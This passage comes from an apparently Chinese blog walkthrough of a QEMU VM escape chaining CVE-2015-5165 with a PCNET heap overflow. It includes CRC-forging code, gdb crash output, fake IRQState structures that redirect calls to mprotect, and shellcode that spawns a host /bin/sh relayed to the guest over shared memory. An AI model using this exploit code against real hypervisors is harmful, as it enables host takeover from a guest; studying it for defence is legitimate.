class="number">0x6ddde4eb</span>, <span class="number">0xf4d4b551</span>, <span class="number">0x83d385c7</span>,</span><br><span class="line">	<span class="number">0x136c9856</span>, <span class="number">0x646ba8c0</span>, <span class="number">0xfd62f97a</span>, <span class="number">0x8a65c9ec</span>,</span><br><span class="line">	<span class="number">0x14015c4f</span>, <span class="number">0x63066cd9</span>, <span class="number">0xfa0f3d63</span>, <span class="number">0x8d080df5</span>,</span><br><span class="line">	<span class="number">0x3b6e20c8</span>, <span class="number">0x4c69105e</span>, <span class="number">0xd56041e4</span>, <span class="number">0xa2677172</span>,</span><br><span class="line">	<span class="number">0x3c03e4d1</span>, <span class="number">0x4b04d447</span>, <span class="number">0xd20d85fd</span>, <span class="number">0xa50ab56b</span>,</span><br><span class="line">	<span class="number">0x35b5a8fa</span>, <span class="number">0x42b2986c</span>, <span class="number">0xdbbbc9d6</span>, <span class="number">0xacbcf940</span>,</span><br><span class="line">	<span class="number">0x32d86ce3</span>, <span class="number">0x45df5c75</span>, <span class="number">0xdcd60dcf</span>, <span class="number">0xabd13d59</span>,</span><br><span class="line">	<span class="number">0x26d930ac</span>, <span class="number">0x51de003a</span>, <span class="number">0xc8d75180</span>, <span class="number">0xbfd06116</span>,</span><br><span class="line">	<span class="number">0x21b4f4b5</span>, <span class="number">0x56b3c423</span>, <span class="number">0xcfba9599</span>, <span class="number">0xb8bda50f</span>,</span><br><span class="line">	<span class="number">0x2802b89e</span>, <span class="number">0x5f058808</span>, <span class="number">0xc60cd9b2</span>, <span class="number">0xb10be924</span>,</span><br><span class="line">	<span class="number">0x2f6f7c87</span>, <span class="number">0x58684c11</span>, <span class="number">0xc1611dab</span>, <span class="number">0xb6662d3d</span>,</span><br><span class="line">	<span class="number">0x76dc4190</span>, <span class="number">0x01db7106</span>, <span class="number">0x98d220bc</span>, <span class="number">0xefd5102a</span>,</span><br><span class="line">	<span class="number">0x71b18589</span>, <span class="number">0x06b6b51f</span>, <span class="number">0x9fbfe4a5</span>, <span class="number">0xe8b8d433</span>,</span><br><span class="line">	<span class="number">0x7807c9a2</span>, <span class="number">0x0f00f934</span>, <span class="number">0x9609a88e</span>, <span class="number">0xe10e9818</span>,</span><br><span class="line">	<span class="number">0x7f6a0dbb</span>, <span class="number">0x086d3d2d</span>, <span class="number">0x91646c97</span>, <span class="number">0xe6635c01</span>,</span><br><span class="line">	<span class="number">0x6b6b51f4</span>, <span class="number">0x1c6c6162</span>, <span class="number">0x856530d8</span>, <span class="number">0xf262004e</span>,</span><br><span class="line">	<span class="number">0x6c0695ed</span>, <span class="number">0x1b01a57b</span>, <span class="number">0x8208f4c1</span>, <span class="number">0xf50fc457</span>,</span><br><span class="line">	<span class="number">0x65b0d9c6</span>, <span class="number">0x12b7e950</span>, <span class="number">0x8bbeb8ea</span>, <span class="number">0xfcb9887c</span>,</span><br><span class="line">	<span class="number">0x62dd1ddf</span>, <span class="number">0x15da2d49</span>, <span class="number">0x8cd37cf3</span>, <span class="number">0xfbd44c65</span>,</span><br><span class="line">	<span class="number">0x4db26158</span>, <span class="number">0x3ab551ce</span>, <span class="number">0xa3bc0074</span>, <span class="number">0xd4bb30e2</span>,</span><br><span class="line">	<span class="number">0x4adfa541</span>, <span class="number">0x3dd895d7</span>, <span class="number">0xa4d1c46d</span>, <span class="number">0xd3d6f4fb</span>,</span><br><span class="line">	<span class="number">0x4369e96a</span>, <span class="number">0x346ed9fc</span>, <span class="number">0xad678846</span>, <span class="number">0xda60b8d0</span>,</span><br><span class="line">	<span class="number">0x44042d73</span>, <span class="number">0x33031de5</span>, <span class="number">0xaa0a4c5f</span>, <span class="number">0xdd0d7cc9</span>,</span><br><span class="line">	<span class="number">0x5005713c</span>, <span class="number">0x270241aa</span>, <span class="number">0xbe0b1010</span>, <span class="number">0xc90c2086</span>,</span><br><span class="line">	<span class="number">0x5768b525</span>, <span class="number">0x206f85b3</span>, <span class="number">0xb966d409</span>, <span class="number">0xce61e49f</span>,</span><br><span class="line">	<span class="number">0x5edef90e</span>, <span class="number">0x29d9c998</span>, <span class="number">0xb0d09822</span>, <span class="number">0xc7d7a8b4</span>,</span><br><span class="line">	<span class="number">0x59b33d17</span>, <span class="number">0x2eb40d81</span>, <span class="number">0xb7bd5c3b</span>, <span class="number">0xc0ba6cad</span>,</span><br><span class="line">	<span class="number">0xedb88320</span>, <span class="number">0x9abfb3b6</span>, <span class="number">0x03b6e20c</span>, <span class="number">0x74b1d29a</span>,</span><br><span class="line">	<span class="number">0xead54739</span>, <span class="number">0x9dd277af</span>, <span class="number">0x04db2615</span>, <span class="number">0x73dc1683</span>,</span><br><span class="line">	<span class="number">0xe3630b12</span>, <span class="number">0x94643b84</span>, <span class="number">0x0d6d6a3e</span>, <span class="number">0x7a6a5aa8</span>,</span><br><span class="line">	<span class="number">0xe40ecf0b</span>, <span class="number">0x9309ff9d</span>, <span class="number">0x0a00ae27</span>, <span class="number">0x7d079eb1</span>,</span><br><span class="line">	<span class="number">0xf00f9344</span>, <span class="number">0x8708a3d2</span>, <span class="number">0x1e01f268</span>, <span class="number">0x6906c2fe</span>,</span><br><span class="line">	<span class="number">0xf762575d</span>, <span class="number">0x806567cb</span>, <span class="number">0x196c3671</span>, <span class="number">0x6e6b06e7</span>,</span><br><span class="line">	<span class="number">0xfed41b76</span>, <span class="number">0x89d32be0</span>, <span class="number">0x10da7a5a</span>, <span class="number">0x67dd4acc</span>,</span><br><span class="line">	<span class="number">0xf9b9df6f</span>, <span class="number">0x8ebeeff9</span>, <span class="number">0x17b7be43</span>, <span class="number">0x60b08ed5</span>,</span><br><span class="line">	<span class="number">0xd6d6a3e8</span>, <span class="number">0xa1d1937e</span>, <span class="number">0x38d8c2c4</span>, <span class="number">0x4fdff252</span>,</span><br><span class="line">	<span class="number">0xd1bb67f1</span>, <span class="number">0xa6bc5767</span>, <span class="number">0x3fb506dd</span>, <span class="number">0x48b2364b</span>,</span><br><span class="line">	<span class="number">0xd80d2bda</span>, <span class="number">0xaf0a1b4c</span>, <span class="number">0x36034af6</span>, <span class="number">0x41047a60</span>,</span><br><span class="line">	<span class="number">0xdf60efc3</span>, <span class="number">0xa867df55</span>, <span class="number">0x316e8eef</span>, <span class="number">0x4669be79</span>,</span><br><span class="line">	<span class="number">0xcb61b38c</span>, <span class="number">0xbc66831a</span>, <span class="number">0x256fd2a0</span>, <span class="number">0x5268e236</span>,</span><br><span class="line">	<span class="number">0xcc0c7795</span>, <span class="number">0xbb0b4703</span>, <span class="number">0x220216b9</span>, <span class="number">0x5505262f</span>,</span><br><span class="line">	<span class="number">0xc5ba3bbe</span>, <span class="number">0xb2bd0b28</span>, <span class="number">0x2bb45a92</span>, <span class="number">0x5cb36a04</span>,</span><br><span class="line">	<span class="number">0xc2d7ffa7</span>, <span class="number">0xb5d0cf31</span>, <span class="number">0x2cd99e8b</span>, <span class="number">0x5bdeae1d</span>,</span><br><span class="line">	<span class="number">0x9b64c2b0</span>, <span class="number">0xec63f226</span>, <span class="number">0x756aa39c</span>, <span class="number">0x026d930a</span>,</span><br><span class="line">	<span class="number">0x9c0906a9</span>, <span class="number">0xeb0e363f</span>, <span class="number">0x72076785</span>, <span class="number">0x05005713</span>,</span><br><span class="line">	<span class="number">0x95bf4a82</span>, <span class="number">0xe2b87a14</span>, <span class="number">0x7bb12bae</span>, <span class="number">0x0cb61b38</span>,</span><br><span class="line">	<span class="number">0x92d28e9b</span>, <span class="number">0xe5d5be0d</span>, <span class="number">0x7cdcefb7</span>, <span class="number">0x0bdbdf21</span>,</span><br><span class="line">	<span class="number">0x86d3d2d4</span>, <span class="number">0xf1d4e242</span>, <span class="number">0x68ddb3f8</span>, <span class="number">0x1fda836e</span>,</span><br><span class="line">	<span class="number">0x81be16cd</span>, <span class="number">0xf6b9265b</span>, <span class="number">0x6fb077e1</span>, <span class="number">0x18b74777</span>,</span><br><span class="line">	<span class="number">0x88085ae6</span>, <span class="number">0xff0f6a70</span>, <span class="number">0x66063bca</span>, <span class="number">0x11010b5c</span>,</span><br><span class="line">	<span class="number">0x8f659eff</span>, <span class="number">0xf862ae69</span>, <span class="number">0x616bffd3</span>, <span class="number">0x166ccf45</span>,</span><br><span class="line">	<span class="number">0xa00ae278</span>, <span class="number">0xd70dd2ee</span>, <span class="number">0x4e048354</span>, <span class="number">0x3903b3c2</span>,</span><br><span class="line">	<span class="number">0xa7672661</span>, <span class="number">0xd06016f7</span>, <span class="number">0x4969474d</span>, <span class="number">0x3e6e77db</span>,</span><br><span class="line">	<span class="number">0xaed16a4a</span>, <span class="number">0xd9d65adc</span>, <span class="number">0x40df0b66</span>, <span class="number">0x37d83bf0</span>,</span><br><span class="line">	<span class="number">0xa9bcae53</span>, <span class="number">0xdebb9ec5</span>, <span class="number">0x47b2cf7f</span>, <span class="number">0x30b5ffe9</span>,</span><br><span class="line">	<span class="number">0xbdbdf21c</span>, <span class="number">0xcabac28a</span>, <span class="number">0x53b39330</span>, <span class="number">0x24b4a3a6</span>,</span><br><span class="line">	<span class="number">0xbad03605</span>, <span class="number">0xcdd70693</span>, <span class="number">0x54de5729</span>, <span class="number">0x23d967bf</span>,</span><br><span class="line">	<span class="number">0xb3667a2e</span>, <span class="number">0xc4614ab8</span>, <span class="number">0x5d681b02</span>, <span class="number">0x2a6f2b94</span>,</span><br><span class="line">	<span class="number">0xb40bbe37</span>, <span class="number">0xc30c8ea1</span>, <span class="number">0x5a05df1b</span>, <span class="number">0x2d02ef8d</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">uint32_t crc_compute(uint8_t *buffer, size_t size)</span><br><span class="line">&#123;</span><br><span class="line">	uint32_t fcs = ~<span class="number">0</span>;</span><br><span class="line">	uint8_t *p = buffer;</span><br><span class="line"></span><br><span class="line">	while (p != &amp;buffer[size])</span><br><span class="line">		CRC(fcs, *p++);</span><br><span class="line"></span><br><span class="line">	return fcs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint32_t crc_reverse(uint32_t current, uint32_t target)</span><br><span class="line">&#123;</span><br><span class="line">	size_t i = <span class="number">0</span>, j;</span><br><span class="line">	uint8_t *ptr;</span><br><span class="line">	uint32_t workspace[<span class="number">2</span>] = &#123; current, target &#125;;</span><br><span class="line">	for (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">		workspace[i] &amp;= (uint32_t)~<span class="number">0</span>;</span><br><span class="line">	ptr = (uint8_t *)(workspace + <span class="number">1</span>);</span><br><span class="line">	for (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">		j = <span class="number">0</span>;</span><br><span class="line">		while(crctab[j] &gt;&gt; <span class="number">24</span> != *(ptr + <span class="number">3</span> - i)) j++;</span><br><span class="line">		*((uint32_t *)(ptr - i)) ^= crctab[j];</span><br><span class="line">		*(ptr - i - <span class="number">1</span>) ^= j;</span><br><span class="line">	&#125;</span><br><span class="line">	return *(uint32_t *)(ptr - <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	uint32_t fcs;</span><br><span class="line">	uint32_t buffer[<span class="number">2</span>] = &#123; <span class="number">0xcafecafe</span> &#125;;</span><br><span class="line">	uint8_t *ptr = (uint8_t *)buffer;</span><br><span class="line"></span><br><span class="line">	fcs = crc_compute(ptr, <span class="number">4</span>);</span><br><span class="line">	printf(<span class="string">"[+] current crc = %010p, required crc = <span class="subst">\n</span>"</span>, fcs);</span><br><span class="line"></span><br><span class="line">	fcs = crc_reverse(fcs, <span class="number">0xdeadbeef</span>);</span><br><span class="line">	printf(<span class="string">"[+] applying patch = %010p<span class="subst">\n</span>"</span>, fcs);</span><br><span class="line">	buffer[<span class="number">1</span>] = fcs;</span><br><span class="line"></span><br><span class="line">	fcs = crc_compute(ptr, <span class="number">8</span>);</span><br><span class="line">	if (fcs == <span class="number">0xdeadbeef</span>)</span><br><span class="line">		printf(<span class="string">"[+] crc patched successfully<span class="subst">\n</span>"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用首先将网卡设置为默认模式，之后配置Tx和Rx描述缓冲区，最后初始化网卡，重启网卡使设置生效</p>
+<p>之后就是发一个触发堆溢出漏洞的数据包，如下所示，qemu_set_irq调用了一个损坏的irq-&gt;handler地址——0x7f66deadbeef。qemu就会崩溃，因为那是一个非法的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) shell ps -e | grep qemu</span><br><span class="line"> 8335 pts/4    00:00:03 qemu-system-x86</span><br><span class="line">(gdb) attach 8335</span><br><span class="line">...</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x00007f669ce6c363 in qemu_set_irq (irq=0x7f66deadbeef, level=0)</span><br><span class="line">43	    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br></pre></td></tr></table></figure>
+
+<p>这是我实践的截图，由于要取irq的handler的值，由于irq是0x5555deadbf1f，这个地址是不可读的，所以崩溃了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1563244885957.jpg" alt></p>
+<h1 id="将上面两个漏洞结合起来实现完整利用"><a href="#将上面两个漏洞结合起来实现完整利用" class="headerlink" title="将上面两个漏洞结合起来实现完整利用"></a>将上面两个漏洞结合起来实现完整利用</h1><p>这一小节，结合前两个漏洞进行虚拟机逃逸，并使用qemu的权限在主机上执行代码</p>
+<p>首先，我们使用CVE-2015-5165来重构qemu的内存布局（其实就是信息泄露），更确切地说，是获得下面的一些地址以绕过ASLR保护：</p>
+<ul>
+<li>guest虚拟机的物理内存基址，在漏洞利用中，我们需要在虚拟机里面申请分配一些内存，获得这个内存在qemu虚拟地址空间的精确地址</li>
+<li>.text 段的基址，这可以让我们获得qemu_set_irq()函数的地址</li>
+<li>.plt段的基址，这可以让我们知道一些函数的地址，比如fork()和execv()函数，他们可以用来构建我们的shellcode。我们mprotect() 函数来改变guest虚拟机的物理地址的权限——记住，分配给guest虚拟机的“物理地址”是不可执行的（即qemu的mmap出来的地址）。</li>
+</ul>
+<h2 id="控制RIP"><a href="#控制RIP" class="headerlink" title="控制RIP"></a>控制RIP</h2><p>在上面我们是可以控制rip寄存器的。假如我们想不然qemu崩溃，我们得溢出PCNET网卡的buffer使得irq结构指向一个我们伪造的IRQState，那就会call我们想调用的函数了。</p>
+<p>首先，我们可能会尝试构建一个假的IRQState结构去调用system函数，然而这会失败，因为一些qemu映射的内存fork之后不能使用这段内存，更确切的说是mmap的物理内存有MADV_DONTFORK标记。（具体可以看这里<a href="http://man7.org/linux/man-pages/man2/madvise.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/madvise.2.html</a> ， 搜索MADV_DONTFORK关键字）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu_madvise(new_block-&gt;host, new_block-&gt;max_length, QEMU_MADV_DONTFORK);</span><br></pre></td></tr></table></figure>
+
+<p>调用execv()也是没用的，因为这样我们会是去对guest虚拟机的控制权</p>
+<p>还有一种想法是我们可以构造一种shellcode——将几个假的IRQState连起来去调用多个函数，因为PCNET网卡模拟器或调用好几次qemu_set_irq()。然而我们发现这样子更方便更可靠——我们先开启shellcode所在内存页的PROT_EXEC标志，之后再执行shellcode。</p>
+<p>我们现在的想法是构造两个假的IRQState结构。第一个结构用于调用mprotect()，第二个就用于调用shellcode——这个shellcode首先撤销MADV_DONTFORK标志，之后执行一个在guest虚拟机和主机之间可交互的shell。</p>
+<p>如前所述，但qemu_set_irq()被调用，它有两个参数——irq (指向 IRQstate 的结构体) 和 level (IRQ level)，之后如下所示调用handler：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void qemu_set_irq(qemu_irq irq, int level)</span><br><span class="line">&#123;</span><br><span class="line">    if (!irq)</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如上，我们只能控制前两个参数，那么有三个参数的mprotect()，我们如何调用呢？</p>
+<p>为了解决这个问题，我们使qemu_set_irq()调用自身，其中参数如下：（其实就是将handler设置为qemu_set_irq函数的地址，我们即可控制level，这操作牛逼）</p>
+<ul>
+<li>irq: 指向假的IRQState，其中handler指针指向mprotect()函数</li>
+<li>level: mprotect的flag设置为： PROT_READ | PROT_WRITE | PROT_EXEC</li>
+</ul>
+<p>这是通过设置两个假的IRQState来实现的，代码片段如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">struct IRQState &#123;</span><br><span class="line">    uint8_t  _nothing[44];</span><br><span class="line">    uint64_t  handler;</span><br><span class="line">    uint64_t  arg_1;</span><br><span class="line">    int32_t   arg_2;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct IRQState  fake_irq[2];</span><br><span class="line">hptr_t fake_irq_mem = gva_to_hva(fake_irq);</span><br><span class="line"></span><br><span class="line">/* do qemu_set_irq */</span><br><span class="line">fake_irq[0].handler = qemu_set_irq_addr;</span><br><span class="line">fake_irq[0].arg_1 = fake_irq_mem + sizeof(struct IRQState);</span><br><span class="line">fake_irq[0].arg_2 = PROT_READ | PROT_WRITE | PROT_EXEC;</span><br><span class="line"></span><br><span class="line">/* do mprotect */</span><br><span class="line">fake_irq[1].handler = mprotec_addrt;</span><br><span class="line">fake_irq[1].arg_1 = (fake_irq_mem &gt;&gt; PAGE_SHIFT) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">fake_irq[1].arg_2 = PAGE_SIZE;</span><br></pre></td></tr></table></figure>
+
+<p>那么现在，就是溢出后，qemu_set_irq()调用了一个fake handler，而这个handler就是qemu_set_irq()自身，这可以将level参数设置为7，而这个是mprotect说需要的，那么之后就是调用mprotect函数了。</p>
+<p>内存现在是可执行的了，我们可以通过将第一个IRQState的handler指向我们的shellcode地址，之后就可以将控制权交给我们的交互式shell。</p>
+<p>payload.fake_irq[0].handler = shellcode_addr;<br>payload.fake_irq[0].arg_1 = shellcode_data;</p>
+<h2 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h2><p>我们可以写一个基础的shellcode——在shell绑定到netcat的某个端口上，之后通过其他计算机连接这个shell。这是一个满意的解决方案，但是我们最好能够规避防火墙。我们可以利用guest虚拟机和主机之间的共享内存来构建一个bindshell。</p>
+<p>利用qemu的漏洞有一点微妙，我们在guest虚拟机写的代码，在qemu进程的内存中是可用的。所以我们不用注入shellcode，我们可以共享代码，使它在guest虚拟机运行，之后攻击host主机。</p>
+<p>下面总结了在host主机和guest虚拟机之间的共享内存和进程，线程。</p>
+<p>我们创建两个共享的环形buffer（in和out）并提供通过自旋锁访问这些共享内存区域读/写的原语。在host主机上，我们运行一段shellcode——运行一个 /bin/sh 的shell，并且复制它的 stdin 和 stdout 文件描述符。我们创建两个线程，第一个从共享内存读取命令并通过管道传递给shell，第二个线程读取shell的输出（从第二个管道读），之后将他们写到共享内存。</p>
+<p>guest虚拟机也有两个线程，第一个线程将用户输入的命令写到共享内存上，第二个线程从共享内存中读取到的输出stdout</p>
+<p>请注意，在我们的exp中，我们有第三个线程（还有一个专用的共享内存）来处理stderr的输出</p>
+<p>下面其实看图更加清晰：</p>
+<p><img src="http://pic.giantbranch.cn/pic/1563268001815.jpg" alt></p>
+<h2 id="VM-Escape-Exploit"><a href="#VM-Escape-Exploit" class="headerlink" title="VM-Escape Exploit"></a>VM-Escape Exploit</h2><p>在这一小节，我们概述完整exp（vm-escape.c）的主要结构和函数。</p>
+<p>注入的payload由下面的结构体定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct payload &#123;</span><br><span class="line">	struct IRQState    fake_irq[2];</span><br><span class="line">	struct shared_data shared_data;</span><br><span class="line">	uint8_t            shellcode[1024];</span><br><span class="line">	uint8_t            pipe_fd2r[1024];</span><br><span class="line">	uint8_t            pipe_r2fd[1024];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>上面的fake_irq是一对假的IRQState结构体，目的是调用mprotect()去改变我们paylaod所在页面的保护为可读可写可执行。</p>
+<p>结构体shared_data是用于将参数传递给主shellcode的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct shared_data &#123;</span><br><span class="line">	struct GOT       got;</span><br><span class="line">	uint8_t          shell[64];</span><br><span class="line">	hptr_t           addr;</span><br><span class="line">	struct shared_io shared_io;</span><br><span class="line">	volatile int     done;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>got结构体充当全局偏移表（Global Offset Table，即GOT表），它包含了shellcode所需的主要函数的地址，这些地址是我们是通过信息泄露获得的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">struct GOT &#123;</span><br><span class="line">	typeof(open)           *open;</span><br><span class="line">	typeof(close)          *close;</span><br><span class="line">	typeof(read)           *read;</span><br><span class="line">	typeof(write)          *write;</span><br><span class="line">	typeof(dup2)           *dup2;</span><br><span class="line">	typeof(pipe)           *pipe;</span><br><span class="line">	typeof(fork)           *fork;</span><br><span class="line">	typeof(execv)          *execv;</span><br><span class="line">	typeof(malloc)         *malloc;</span><br><span class="line">	typeof(madvise)        *madvise;</span><br><span class="line">	typeof(pthread_create) *pthread_create;</span><br><span class="line">	typeof(pipe_r2fd)      *pipe_r2fd;</span><br><span class="line">	typeof(pipe_fd2r)      *pipe_fd2r;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>主shellcode是由下面的结构体定义的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">/* main code to run after %rip control */</span><br><span class="line">void shellcode(struct shared_data *shared_data)</span><br><span class="line">&#123;</span><br><span class="line">    pthread_t t_in, t_out, t_err;</span><br><span class="line">    int in_fds[2], out_fds[2], err_fds[2];</span><br><span class="line">    struct brwpipe *in, *out, *err;</span><br><span class="line">    char *args[2] = &#123; shared_data-&gt;shell, NULL &#125;;</span><br><span class="line"></span><br><span class="line">    // 判断shared_data-&gt;done，避免shellcode函数运行多次</span><br><span class="line">    if (shared_data-&gt;done) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    // 设置shared_data-&gt;addr为MADV_DOFORK，即去除MADV_DONTFORK标记</span><br><span class="line">    shared_data-&gt;got.madvise((uint64_t *)shared_data-&gt;addr,</span><br><span class="line">                             PHY_RAM, MADV_DOFORK);</span><br><span class="line"></span><br><span class="line">    //创建三个管道，分别是输入，输出和错误的</span><br><span class="line">    shared_data-&gt;got.pipe(in_fds);</span><br><span class="line">    shared_data-&gt;got.pipe(out_fds);</span><br><span class="line">    shared_data-&gt;got.pipe(err_fds);</span><br><span class="line"></span><br><span class="line">    //申请内存</span><br><span class="line">    in = shared_data-&gt;got.malloc(sizeof(struct brwpipe));</span><br><span class="line">    out = shared_data-&gt;got.malloc(sizeof(struct brwpipe));</span><br><span class="line">    err = shared_data-&gt;got.malloc(sizeof(struct brwpipe));</span><br><span class="line"></span><br><span class="line">    //给brwpipe传递数据</span><br><span class="line">    in-&gt;got = &amp;shared_data-&gt;got;</span><br><span class="line">    out-&gt;got = &amp;shared_data-&gt;got;</span><br><span class="line">    err-&gt;got = &amp;shared_data-&gt;got;</span><br><span class="line"></span><br><span class="line">    in-&gt;fd = in_fds[1];</span><br><span class="line">    out-&gt;fd = out_fds[0];</span><br><span class="line">    err-&gt;fd = err_fds[0];</span><br><span class="line"></span><br><span class="line">    in-&gt;ring = &amp;shared_data-&gt;shared_io.in;</span><br><span class="line">    out-&gt;ring = &amp;shared_data-&gt;shared_io.out;</span><br><span class="line">    err-&gt;ring = &amp;shared_data-&gt;shared_io.err;</span><br><span class="line"></span><br><span class="line">    if (shared_data-&gt;got.fork() == 0) &#123;</span><br><span class="line">        // 子进程</span><br><span class="line">        // 关闭in_fds的输出，out_fds和err_fds的输入</span><br><span class="line">        //之后就是分别复制到0，1，2</span><br><span class="line">        //最后执行shellcode</span><br><span class="line">        shared_data-&gt;got.close(in_fds[1]);</span><br><span class="line">        shared_data-&gt;got.close(out_fds[0]);</span><br><span class="line">        shared_data-&gt;got.close(err_fds[0]);</span><br><span class="line">        shared_data-&gt;got.dup2(in_fds[0], 0);</span><br><span class="line">        shared_data-&gt;got.dup2(out_fds[1], 1);</span><br><span class="line">        shared_data-&gt;got.dup2(err_fds[1], 2);</span><br><span class="line">        //那么shell的执行标准输入、标准输出和标准错误分别对应in_fds[0]，out_fds[1]，err_fds[1]</span><br><span class="line">        shared_data-&gt;got.execv(shared_data-&gt;shell, args);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // 父进程，与子进程的close刚好相反</span><br><span class="line">        shared_data-&gt;got.close(in_fds[0]);</span><br><span class="line">        shared_data-&gt;got.close(out_fds[1]);</span><br><span class="line">        shared_data-&gt;got.close(err_fds[1]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //创建三个线程</span><br><span class="line">        //从共享内存读，之后写到in-&gt;fd，即 in_fds[1]</span><br><span class="line">        shared_data-&gt;got.pthread_create(&amp;t_in, NULL,</span><br><span class="line">                                        shared_data-&gt;got.pipe_r2fd, in);</span><br><span class="line">        //从out-&gt;fd（即out_fds[0]）读，之后写到共享内存</span><br><span class="line">        shared_data-&gt;got.pthread_create(&amp;t_out, NULL,</span><br><span class="line">                                        shared_data-&gt;got.pipe_fd2r, out);</span><br><span class="line">        //从err-&gt;fd读（即err_fds[0]），之后写到共享内存</span><br><span class="line">        shared_data-&gt;got.pthread_create(&amp;t_err, NULL,</span><br><span class="line">                                        shared_data-&gt;got.pipe_fd2r, err);</span><br><span class="line"></span><br><span class="line">        //设置shared_data-&gt;done为1</span><br><span class="line">        shared_data-&gt;done = 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的shellcode()函数首先检查一下 shared_data-&gt;done，避免shellcode()函数执行多次（因为qemu_set_irq会被qemu代码调用多次，而qemu_set_irq又会调用shellcode函数）</p>
